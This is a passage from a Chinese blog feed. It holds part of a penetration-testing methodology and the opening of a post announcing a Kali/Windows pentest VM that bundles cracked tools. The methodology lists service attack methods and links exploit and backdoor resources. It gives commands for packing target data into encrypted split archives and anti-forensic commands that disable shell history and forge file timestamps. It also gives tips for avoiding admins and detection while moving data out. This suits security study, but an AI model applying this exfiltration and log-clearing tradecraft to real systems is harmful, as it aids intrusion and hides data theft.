软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><ul><li><p>端口：22</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破</li><li>后门</li><li>漏洞：28退格漏洞、OpenSSL漏洞</li></ul></li><li><p>参考</p></li><li><ul><li><a href="https://cloud.tencent.com/developer/article/1078187">https://cloud.tencent.com/developer/article/1078187</a></li></ul></li></ul><h3 id="-31"><a href="#-31" class="headerlink" title=""></a></h3><h3 id="2-5-5-Telnet-服务"><a href="#2-5-5-Telnet-服务" class="headerlink" title="2.5.5 Telnet 服务"></a><strong>2.5.5 Telnet 服务</strong></h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。</p><ul><li><p>默认端口：21</p></li><li><p>攻击方法：</p></li><li><ul><li>爆破</li><li>嗅探</li></ul></li></ul><h3 id="-32"><a href="#-32" class="headerlink" title=""></a></h3><h3 id="2-5-6-Windows-远程连接"><a href="#2-5-6-Windows-远程连接" class="headerlink" title="2.5.6 Windows 远程连接"></a><strong>2.5.6 Windows 远程连接</strong></h3><ul><li><p>默认端口：3389</p></li><li><p>攻击方法</p></li><li><ul><li>爆破</li><li>Shift粘滞键后门：5次shift后门</li><li>利用ms12-020攻击3389端口</li></ul></li></ul><h3 id="-33"><a href="#-33" class="headerlink" title=""></a></h3><h3 id="2-5-7-VNC服务"><a href="#2-5-7-VNC服务" class="headerlink" title="2.5.7 VNC服务"></a><strong>2.5.7 VNC服务</strong></h3><p>VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。</p><ul><li><p>默认端口：5900+桌面ID（5901；5902）</p></li><li><p>攻击方式：</p></li><li><ul><li>爆破：弱口令</li><li>认证口令绕过：</li><li>拒绝服务攻击：（CVE-2015-5239）</li><li>权限提升：（CVE-2013-6886）</li></ul></li></ul><h3 id="-34"><a href="#-34" class="headerlink" title=""></a></h3><h3 id="2-5-8-SMTP协议"><a href="#2-5-8-SMTP协议" class="headerlink" title="2.5.8 SMTP协议"></a><strong>2.5.8 SMTP协议</strong></h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p><ul><li><p>默认端口：25（smtp）、465（smtps）</p></li><li><p>攻击方式：</p></li><li><ul><li>爆破：弱口令</li><li>未授权访问</li></ul></li></ul><h3 id="-35"><a href="#-35" class="headerlink" title=""></a></h3><h3 id="2-5-9-POP3协议"><a href="#2-5-9-POP3协议" class="headerlink" title="2.5.9 POP3协议"></a><strong>2.5.9 POP3协议</strong></h3><ul><li><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p></li><li><p>攻击方式：</p></li><li><ul><li>爆破；弱口令</li><li>未授权访问；</li></ul></li></ul><h3 id="-36"><a href="#-36" class="headerlink" title=""></a></h3><h3 id="2-5-10-DNS服务"><a href="#2-5-10-DNS服务" class="headerlink" title="2.5.10 DNS服务"></a><strong>2.5.10 DNS服务</strong></h3><ul><li><p>默认端口：53</p></li><li><p>攻击方式：</p></li><li><ul><li>区域传输漏洞</li></ul></li></ul><h3 id="-37"><a href="#-37" class="headerlink" title=""></a></h3><h3 id="2-5-11-IMAP协议"><a href="#2-5-11-IMAP协议" class="headerlink" title="2.5.11 IMAP协议"></a><strong>2.5.11 IMAP协议</strong></h3><ul><li><p>默认端口：143（imap）、993（imaps）</p></li><li><p>攻击方式：</p></li><li><ul><li>爆破：弱口令</li><li>配置不当</li></ul></li></ul><h3 id="-38"><a href="#-38" class="headerlink" title=""></a></h3><h3 id="2-5-12-SNMP协议"><a href="#2-5-12-SNMP协议" class="headerlink" title="2.5.12 SNMP协议"></a><strong>2.5.12 SNMP协议</strong></h3><ul><li><p>默认端口：161</p></li><li><p>攻击方式:</p></li><li><ul><li>爆破：弱口令</li></ul></li></ul><h3 id="-39"><a href="#-39" class="headerlink" title=""></a></h3><h3 id="2-5-13-DHCP服务"><a href="#2-5-13-DHCP服务" class="headerlink" title="2.5.13 DHCP服务"></a><strong>2.5.13 DHCP服务</strong></h3><ul><li><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p></li><li><p>攻击方式：</p></li><li><ul><li>DHCP劫持；</li></ul></li></ul><h2 id="2-6-云环境"><a href="#2-6-云环境" class="headerlink" title="2.6 云环境"></a><strong>2.6 云环境</strong></h2><h3 id="2-6-1-VMware"><a href="#2-6-1-VMware" class="headerlink" title="2.6.1 VMware"></a><strong>2.6.1 VMware</strong></h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p><ul><li><p>端口（很多）：</p></li><li><ul><li><a href="https://kb.vmware.com/s/article/2115330">https://kb.vmware.com/s/article/2115330</a></li><li><a href="https://kb.vmware.com/s/article/2081930">https://kb.vmware.com/s/article/2081930</a></li></ul></li><li><p>漏洞</p></li><li><ul><li>主机逃逸</li><li>CVE-2017-5638</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://paper.seebug.org/348/">https://paper.seebug.org/348/</a></li><li><a href="http://www.freebuf.com/articles/system/141179.html">http://www.freebuf.com/articles/system/141179.html</a></li><li><a href="http://www.mottoin.com/100651.html">http://www.mottoin.com/100651.html</a></li><li><a href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</a></li><li><a href="https://twitter.com/VMwareSRC">https://twitter.com/VMwareSRC</a></li><li><a href="https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</a></li><li><a href="https://www.vmware.com/cn/security/hardening-guides.html">https://www.vmware.com/cn/security/hardening-guides.html</a></li></ul></li></ul><h3 id="-40"><a href="#-40" class="headerlink" title=""></a></h3><h3 id="2-6-2-OpenStack"><a href="#2-6-2-OpenStack" class="headerlink" title="2.6.2 OpenStack"></a><strong>2.6.2 OpenStack</strong></h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p><ul><li><p>漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</p></li><li><ul><li>权限绕过漏洞</li><li>信息泄露</li><li>代码执行漏洞</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</a></li><li><a href="http://www.freebuf.com/news/topnews/107203.html">http://www.freebuf.com/news/topnews/107203.html</a></li></ul></li></ul><h3 id="2-6-3-Docker"><a href="#2-6-3-Docker" class="headerlink" title="2.6.3 Docker"></a><strong>2.6.3 Docker</strong></h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制[1]。Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd – nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p><ul><li><p>安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</p></li><li><ul><li>CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</li><li>CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞</li><li>CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</li><li>CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</li><li>CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</li><li>CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</li><li>CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</li><li>内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</li><li>拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</li><li>容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</li><li>有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。</li></ul></li><li><p>参考：</p></li><li><ul><li><a href="https://toutiao.io/posts/2y9xx8/preview">https://toutiao.io/posts/2y9xx8/preview</a></li><li><a href="http://www.yunweipai.com/archives/21610.html">http://www.yunweipai.com/archives/21610.html</a></li><li><a href="http://www.91ri.org/15837.html">http://www.91ri.org/15837.html</a></li><li><a href="https://blog.csdn.net/ruidu_doer/article/details/53401523">https://blog.csdn.net/ruidu_doer/article/details/53401523</a></li><li><a href="https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="http://dockone.io/article/150">http://dockone.io/article/150</a></li><li><a href="http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</a></li><li><a href="https://blog.waterstrong.me/docker-security/">https://blog.waterstrong.me/docker-security/</a></li></ul></li></ul><h2 id="2-7-大数据"><a href="#2-7-大数据" class="headerlink" title="2.7 大数据"></a><strong>2.7 大数据</strong></h2><h3 id="2-7-1-Elsaticsearch"><a href="#2-7-1-Elsaticsearch" class="headerlink" title="2.7.1 Elsaticsearch"></a><strong>2.7.1 Elsaticsearch</strong></h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p><ul><li><p>默认端口：9200（）、9300（）</p></li><li><p>攻击方法：</p></li><li><ul><li>未授权访问；</li><li>远程命令执行；</li><li>文件遍历；</li><li>低版本webshell植入；</li></ul></li><li><p>参考</p></li><li><ul><li><a href="http://www.freebuf.com/sectool/38025.html">http://www.freebuf.com/sectool/38025.html</a></li><li><a href="https://www.secpulse.com/archives/5401.html">https://www.secpulse.com/archives/5401.html</a></li></ul></li></ul><h3 id="-41"><a href="#-41" class="headerlink" title=""></a></h3><h3 id="2-7-2-hadoop"><a href="#2-7-2-hadoop" class="headerlink" title="2.7.2 hadoop"></a><strong>2.7.2 hadoop</strong></h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。Hadoop就是一个分布式计算的解决方案。</p><p>参考：</p><ul><li><a href="https://tech.meituan.com/hadoop-security-practice.html">https://tech.meituan.com/hadoop-security-practice.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/33525241">https://zhuanlan.zhihu.com/p/33525241</a></li><li><a href="https://www.anquanke.com/post/id/85343">https://www.anquanke.com/post/id/85343</a></li><li><a href="https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</a></li></ul><h3 id="-42"><a href="#-42" class="headerlink" title=""></a></h3><h3 id="2-7-3-Hive"><a href="#2-7-3-Hive" class="headerlink" title="2.7.3 Hive"></a><strong>2.7.3 Hive</strong></h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p><p>参考：</p><ul><li><a href="https://cwiki.apache.org/confluence/display/Hive/Security">https://cwiki.apache.org/confluence/display/Hive/Security</a></li><li><a href="https://www.cnblogs.com/yejibigdata/p/6394719.html">https://www.cnblogs.com/yejibigdata/p/6394719.html</a></li></ul><h3 id="-43"><a href="#-43" class="headerlink" title=""></a></h3><h3 id="2-7-4-Sqoop"><a href="#2-7-4-Sqoop" class="headerlink" title="2.7.4 Sqoop"></a><strong>2.7.4 Sqoop</strong></h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p><p>参考</p><ul><li><a href="https://sqoop.apache.org/docs/1.99.7/security.html">https://sqoop.apache.org/docs/1.99.7/security.html</a></li></ul><h3 id="-44"><a href="#-44" class="headerlink" title=""></a></h3><h3 id="2-7-5-HBase"><a href="#2-7-5-HBase" class="headerlink" title="2.7.5 HBase"></a><strong>2.7.5 HBase</strong></h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p><p>参考：</p><ul><li><a href="https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</a></li><li><a href="http://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html">http://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</a></li></ul><h3 id="-45"><a href="#-45" class="headerlink" title=""></a></h3><h3 id="2-7-6-Spark"><a href="#2-7-6-Spark" class="headerlink" title="2.7.6 Spark"></a><strong>2.7.6 Spark</strong></h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。参考：</p><ul><li><a href="http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</a></li></ul><h1 id="三、提权权限维持"><a href="#三、提权权限维持" class="headerlink" title="三、提权权限维持"></a><strong>三、提权权限维持</strong></h1><h2 id="3-1-提权"><a href="#3-1-提权" class="headerlink" title="3.1 提权"></a><strong>3.1 提权</strong></h2><p>SecWiki 总结了：</p><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></li></ul><h2 id="3-2建立后门-端口转发"><a href="#3-2建立后门-端口转发" class="headerlink" title="3.2建立后门/端口转发"></a><strong>3.2建立后门/端口转发</strong></h2><p>参考：</p><ul><li><a href="http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html">http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html</a></li><li><a href="https://1sparrow.com/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/">https://1sparrow.com/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/</a></li><li><a href="http://drops.xmd5.com/static/drops/tools-15000.html">http://drops.xmd5.com/static/drops/tools-15000.html</a></li></ul><p><strong>端口转发及代理类工具</strong></p><ul><li>LCX：windows下面的端口转发软件。</li><li>sockscap：主要针对windows平台的端口转发和代理转发。</li><li>proxifier：跨平台的端口转发和代理工具，适用windows，linux， Macos平台，代理转发利器</li><li>Rsscoks：＊nix平台下的端口转发和代理工具，配合proxychains好用 到不行。</li><li>Proxychains：＊nix平台下老牌的socks代理工具，一般的系统都会自 带，谁用谁知道。</li><li>ssh proxy：通过ssh做端口代理和转发，一般＊nix系统都自带。</li><li>netcat：socat，hping，在很多情况下可以做端口转发和数据代理转 发。</li><li>metasploit：metasploit的后渗透模块中有不少代理模块和端口转发 模块。</li></ul><p>在中转服务器上下载端口转发工具（加密压缩）：</p><ul><li>能连接互联网下载</li><li>通过 mstsc 的磁盘加载</li><li>通过入口服务器中转</li><li>通过远程控制软件上传</li></ul><h2 id="-46"><a href="#-46" class="headerlink" title=""></a></h2><h2 id="3-3-传输文件"><a href="#3-3-传输文件" class="headerlink" title="3.3 传输文件"></a><strong>3.3 传输文件</strong></h2><h3 id="3-3-1-文件打包"><a href="#3-3-1-文件打包" class="headerlink" title="3.3.1 文件打包"></a><strong>3.3.1 文件打包</strong></h3><p>关于打包</p><ul><li><p>Rar文件打包，压缩d:\data\目录下所有2013-01-01后修改的doc文件，100M/包密码为Pass，-x为排除选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar.exe a–r –v100m new.rar –ta20130101000000 –hpPass –n*.doc –x*.exe d:\data\</span><br></pre></td></tr></table></figure></li><li><p>7z加密，压缩d:\data下所有文件，密码为Pass，分卷100M/包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe a c:\xx.7z -pPass -mhe d:\data -v100m</span><br></pre></td></tr></table></figure></li><li><p>Linux用 tar 打包文件是可以加密码，要跟openssl结合使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf - pma|openssl des3 -salt -k password | dd of=pma.des3</span><br></pre></td></tr></table></figure></li><li><ul><li><p>使用 tar 对加密文件解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=pma.des3 |openssl des3 -d -k password|tar zxf -</span><br></pre></td></tr></table></figure><p>### 3.4.2 文件传输 几个思路</p></li></ul></li><li><p>使用端口转发直接传送数据；</p></li><li><p>搭建 FTP、HTTP 协议；</p></li><li><p>上传到云端再下载；</p></li></ul><h2 id="-47"><a href="#-47" class="headerlink" title=""></a></h2><h2 id="3-4-制作后门-木马程序"><a href="#3-4-制作后门-木马程序" class="headerlink" title="3.4 制作后门/木马程序"></a><strong>3.4 制作后门/木马程序</strong></h2><p>一般用Matisploit 的 msfvenom，使用参考：</p><ul><li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a></li><li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a></li></ul><p>SET 也可以生成后门程序，另外也可以关注一下最新的 Office、PDF 的漏洞</p><h1 id="-48"><a href="#-48" class="headerlink" title=""></a></h1><h1 id="四、日志清理"><a href="#四、日志清理" class="headerlink" title="四、日志清理"></a><strong>四、日志清理</strong></h1><p><strong>在做日志清理前需要了解以下的内容：</strong></p><ul><li>攻击和入侵很难完全删除痕迹，没有日志记录本身就是一种入侵特征；</li><li>删除或清理入侵系统的本地日志不代表删除了痕迹，在网络设备、安全设备、集中化日志系统上仍然留存记录；</li><li>留存的后门本身会有攻击者的信息；</li><li>使用的代理或跳板可能会被反向入侵;</li><li>在操作前检查是否有管理员登录；</li><li>删除上传的工具，使用磁盘覆写的功能删除；</li></ul><p><strong>Windows日志类型</strong></p><ul><li>web日志：IIS、Apache以及其它web日志</li><li>操作日志：3389登录列表、最近访问文件、IE等浏览 器访问日志、文件访问日志</li><li>登陆日志：系统应用日志-安全日志等</li><li>攻击前和状态还原，尽量保持一致</li></ul><p><strong>Linux操作日志</strong></p><ul><li><p>Linux历史操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</span><br></pre></td></tr></table></figure></li><li><p>SSHD登陆记录 删除~/.ssh/known_hosts中记录</p></li><li><p>修改文件时间戳 touch –r 原文件要修改文件</p></li><li><p>删除临时使用文件，尤其是tmp目录</p></li><li><p>logtamper</p></li></ul><h1 id="-49"><a href="#-49" class="headerlink" title=""></a></h1><h1 id="5-工具和其他"><a href="#5-工具和其他" class="headerlink" title="5 工具和其他"></a><strong>5 工具和其他</strong></h1><ol><li><p>内网使用工具渗透的一些原则</p></li><li><ul><li><p>使用适合自己的工具，工具没必要收集太多，够用就行；</p></li><li><p>能根据实际情况编写适用的工具；</p></li><li><p>不能确保安全的工具均要在虚拟机中运行（很 多捆绑病毒木马）；</p></li><li><p>做安全检查的话，尽量使用 GitHub 上开源的工具。</p></li></ul></li><li><p>工具介绍 个人习惯使用 kali 自带工具，特定 POC 先从 Github 上搜索。推荐一个工具介绍的网站：<a href="https://www.kitploit.com/">https://www.kitploit.com/</a></p></li><li><p>渗透注意事项</p></li><li><ul><li>检查内网监控防范系统</li><li>谨慎使用ARP软件和大面积扫描软件</li><li>使用目标网络中无空闲机器，作为打包对象</li><li>使用内网大流量机器作为传输对象，如wsus服务 器、视频会议系统</li><li>使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作 渗透注意事项</li><li>禁止使用psexec.exe</li><li>打包时避开用户工作时间</li><li>控制卷包大小&lt;100M</li><li>选择用户常用压缩软件</li><li>错峰下载数据</li><li>控制传输流量</li><li>清除所有操作日志</li><li>登录主机前先看看管理员是否在</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;一、渗透流程&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;信息收集&lt;/li&gt;
&lt;li&gt;漏洞验证/漏洞攻击&lt;/li&gt;
&lt;li&gt;提权，权限维持&lt;/li&gt;
&lt;li&gt;日志清理&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; clas</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>~Windows10 Penetration Suite Toolkit within Kali Linux v4.0~</title>
    <link href="http://example.com/2022/12/09/Windows10-Penetration-Suite-Toolkit-within-Kali-Linux-v4-0/"/>
    <id>http://example.com/2022/12/09/Windows10-Penetration-Suite-Toolkit-within-Kali-Linux-v4-0/</id>
    <published>2022-12-09T07:48:43.000Z</published>
    <updated>2022-12-09T08:04:23.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-12-06-更新说明"><a href="#2022-12-06-更新说明" class="headerlink" title="2022.12.06 更新说明:"></a><strong>2022.12.06 更新说明:</strong></h1><ol><li><strong>由于Kali的图形化模式占用资源造成卡顿，且使用率不高，<del>特此去除图形化模式</del>。</strong></li></ol><blockquote><p><strong><a href="https://blog.csdn.net/weixin_44285782/article/details/107442217">参考链接</a></strong></p></blockquote><ol><li><strong>VMware Workstation 不可恢复错误（vcpu-0）解决方法:</strong></li></ol><ul><li><strong>升级VMware至17.0<a href="https://www.ghxi.com/vmware17.html">最新版</a></strong></li><li><strong>虚拟机设置-处理器-虚拟化引擎，关闭“虚拟化Intel VT-x/EPT 或 AMD-V/RVI(V)”</strong></li><li><strong>虚拟机设置-显示器-3D图形，关闭“加速3D图形”</strong></li><li><strong>开启物理机bios设置的CPU虚拟化</strong></li></ul><blockquote><p><strong><a href="https://blog.csdn.net/weixin_43978472/article/details/123347650">参考链接</a></strong></p></blockquote><ol><li><strong>补充了大量实用工具，升级部分软件为最新版；</strong></li><li><strong>重构了“漏洞工具” 的目录分类，查找更方便快捷；</strong></li><li><strong>重构了开始菜单及快捷启动索引；</strong></li><li><strong>特别鸣谢:</strong></li></ol><blockquote><p><strong>@棉花糖网络安全圈 @利刃信安 @果核剥壳 @雨苁 @狐狸说安全 @暗魂攻防实验室</strong></p></blockquote><ol><li><strong>今后的更新方式:</strong></li></ol><ul><li><strong>添加或升级软件等小幅更新会同步在网盘发布软件安装包；</strong></li><li><strong>重大升级更新或迭代会重新制作虚拟机镜像。</strong></li></ul><h1 id="系统简介"><a href="#系统简介" class="headerlink" title="系统简介:"></a><strong>系统简介:</strong></h1><ol><li><strong>基于Win10 Workstation 21H2 x64 原版镜像制作（不适用于ARM设备）；</strong></li><li><strong>完整安装WSL Kali Linux 2022.3；</strong></li><li><strong>精简系统自带软件，美化字体及部分图标，适度优化；</strong></li><li><strong>使用单磁盘文件存储，提升性能；</strong></li></ol><ul><li><strong>推荐运行环境:</strong></li><li><strong>vmware:16.x（vmware图形内存1G）</strong></li><li><strong>运行内存:8G</strong></li><li><strong>固态硬盘:200G</strong></li></ul><h1 id="制作声明"><a href="#制作声明" class="headerlink" title="制作声明:"></a><strong>制作声明:</strong></h1><ol><li><strong>所有的安装类软件均下载自软件对应的官方网站；</strong></li><li><strong>所有的绿色类软件均下载自<a href="https://www.ghxi.com/">果核剥壳</a> ；</strong></li><li><strong>所有的脚本类工具均下载自github；</strong></li><li><strong>部分授权类工具（破解版）及优秀的渗透工具来自微信公号分享；</strong></li></ol><ul><li><strong>排名不分先后，同时也推荐大家关注，一起变得更强。</strong></li></ul><blockquote><p><strong>雾晓安全、果核剥壳、归零安全、潇湘信安、学蚁致用、谢公子学安全、利刃信安、棉花糖网络安全圈、狐狸说安全、HACK技术沉淀营、无尾熊安全、T00ls、渗透攻击红队、洛米唯熊、雷石安全实验室、酒仙桥六号部队、InBug实验室、鸿鹄实验室、黑白之道、HACK之道、GobySec、Gcow安全团队、Gamma实验室、CobaltStrike实战、网络安全与黑客技术、QZ的安全悟道、菜鸟学信安、乌雲安全、白帽子飙车路、信安之路、chaosec、鸟哥谈安全、安全小飞侠、moonsec、系统安全运维、天驿安全、零组攻防实验室、Lemonsec、橘猫学安全、Hacking黑白红、渗透安全团队、渗透xiao白帽、白帽子社区、HACK学习呀、猪猪谈安全、开普勒安全团队、吾爱破解论坛、WhITECat安全团队、寻云安全团队、Khan安全攻防实验室、Bypass、天億网络安全、关注安全技术、玄魂工作室、边界骇客、零度安全攻防实验室、WgpSec狼组安全团队、黑白天实验室、靶机狂魔、渗透云笔记、TeamsSix、hijackY、重生信息安全、TimeLine Sec、GobySec、Gcow安全团队、冰蚕实验室。</strong></p></blockquote><ol><li><strong>本集成环境是根据本人渗透工作和学习中的侧重点进行制作，不可能做到满足所有人的需求；</strong></li><li><strong>本项目制作的初衷是帮助渗透新手快速搭建工作环境，工欲善其事，必先利其器；</strong></li><li><strong>本项目由于后期调试原因可能会遗留部分本人的信息，请直接忽视；</strong></li><li><strong>本项目坚决不接受也从未曾接受任何形式的赞助；</strong></li><li><strong>如果您有好的意见或者建议，请联系邮箱 <a href="mailto:burpsuite@qq.com">burpsuite@qq.com</a>。</strong></li></ol><h1 id="免责声明"><a href="#免责声明" class="headerlink" 